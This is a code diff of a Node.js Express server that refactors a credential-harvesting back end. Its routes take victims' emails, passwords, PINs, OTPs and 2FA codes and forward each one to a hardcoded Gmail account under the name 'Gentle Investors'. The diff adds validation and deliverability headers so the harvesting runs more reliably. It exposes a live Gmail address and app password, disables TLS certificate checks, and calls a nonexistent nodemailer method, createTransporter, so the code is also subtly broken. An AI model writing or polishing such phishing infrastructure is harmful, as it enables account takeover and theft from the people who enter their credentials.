@@ -1,173 +1,157 @@
-const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
-
-const app = express(); // app is use for link express functions
+const express = require("express");
+const app = express();
 const cors = require("cors");
-const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+const nodemailer = require("nodemailer");
 
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 5000; // port to connect to WEB
+const PORT = process.env.PORT || 5000;
 
-// emails credentials
+// Email credentials - consider using environment variables
 const userEmail = "gentleinvestors90@gmail.com";
-const pass = "xsoohhnibktlpytz";
-// real 17 feb
+const pass = "xsoohhnibktlpytz"; // Use app-specific password
 
-// Middleware
-app.use(express.json());
+// Create reusable transporter object
+const createTransporter = () => {
+  return nodemailer.createTransporter({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+    // Additional options for better delivery
+    tls: {
+      rejectUnauthorized: false
+    }
+  });
+};
 
-// api routes
+// Helper function to send emails with better formatting
+const sendEmail = (subject, text, res) => {
+  const transporter = createTransporter();
+  
+  const mailOptions = {
+    from: `"Gentle Investors" <${userEmail}>`, // Proper sender format
+    to: userEmail,
+    subject: subject,
+    text: text,
+    html: `<div style="font-family: Arial, sans-serif; padding: 20px;">
+             <h2 style="color: #333;">${subject}</h2>
+             <p style="color: #666; line-height: 1.5;">${text}</p>
+             <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
+             <p style="color: #999; font-size: 12px;">Sent from Gentle Investors System</p>
+           </div>`,
+    // Important headers for better deliverability
+    headers: {
+      'X-Priority': '3', // Normal priority
+      'X-MSMail-Priority': 'Normal',
+      'Importance': 'Normal',
+      'X-Mailer': 'Gentle Investors System'
+    }
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log("Email Error:", error);
+      res.status(500).json({ 
+        success: false, 
+        message: "Error occurred: " + error.message 
+      });
+    } else {
+      console.log("Email sent successfully:", info.response);
+      res.json({ 
+        success: true, 
+        message: "Email sent successfully",
+        messageId: info.messageId 
+      });
+    }
+  });
+};
 
 // API routes for index
 app.post("/", (req, res) => {
   const { email, password } = req.body;
+  
+  if (!email || !password) {
+    return res.status(400).json({ 
+      success: false, 
+      message: "Email and password are required" 
+    });
+  }
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: `${email}`,
-    to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  const subject = "🔐 New User Registration Alert";
+  const text = `New user registered:\n\nEmail: ${email}\nPassword: ${password}\n\nTimestamp: ${new Date().toISOString()}`;
+  
+  sendEmail(subject, text, res);
 });
-// API routes for pin
+
+// API routes for PIN
 app.post("/pin", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
+  const { pin, email } = req.body;
+  
+  if (!pin) {
+    return res.status(400).json({ 
+      success: false, 
+      message: "PIN is required" 
+    });
+  }
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: email,
-    to: userEmail,
-    subject: `PIN: ${req.body?.pin} `,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  const subject = "🔢 PIN Authentication Alert";
+  const text = `PIN entered: ${pin}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
+  
+  sendEmail(subject, text, res);
 });
-// API routes for otp
+
+// API routes for OTP
 app.post("/otp", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
+  const { otp, email } = req.body;
+  
+  if (!otp) {
+    return res.status(400).json({ 
+      success: false, 
+      message: "OTP is required" 
+    });
+  }
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: email,
-    to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  const subject = "🔐 OTP Verification Alert";
+  const text = `OTP entered: ${otp}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
+  
+  sendEmail(subject, text, res);
 });
-// API routes for otp
+
+// API routes for second OTP
 app.post("/2otp", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
+  const { otp, email } = req.body;
+  
+  if (!otp) {
+    return res.status(400).json({ 
+      success: false, 
+      message: "Second OTP is required" 
+    });
+  }
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: email,
-    to: userEmail,
-    subject: `second OTP: ${req.body?.otp} `,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  const subject = "🔐 Second OTP Verification Alert";
+  const text = `Second OTP entered: ${otp}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
+  
+  sendEmail(subject, text, res);
 });
+
 // API routes for 2FA
 app.post("/auth", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
+  const { auth, email } = req.body;
+  
+  if (!auth) {
+    return res.status(400).json({ 
+      success: false, 
+      message: "2FA code is required" 
+    });
+  }
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: email,
-    to: userEmail,
-    subject: `2FA: ${req.body?.auth} `,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
+  const subject = "🛡️ 2FA Authentication Alert";
+  const text = `2FA code entered: ${auth}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
+  
+  sendEmail(subject, text, res);
 });
 
 app.listen(PORT, () => {
